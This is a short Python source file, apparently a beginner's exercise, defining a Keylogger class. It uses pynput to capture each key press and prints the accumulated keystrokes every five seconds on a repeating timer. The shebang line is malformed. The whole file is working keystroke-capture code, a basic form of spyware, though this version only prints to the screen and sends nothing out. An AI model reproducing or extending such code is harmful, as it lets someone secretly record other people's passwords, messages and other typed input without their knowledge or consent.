#!/usr/binenv python
import pynput
from threading import Timer

class Keylogger:
    def __init__(self):
        self.log = ""
        print("We are in constructor method")

    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_process(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key==key.space:
                current_key = " "
            else:
                current_key = " " + str(key)
        self.append_to_log(str(current_key))


    def report(self):
        print(self.log)
        self.log = ""
        Timer_time_func = Timer(5, self.report)
        Timer_time_func.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.process_key_process) as keyboard_listener:
            self.report()
            keyboard_listener.join()


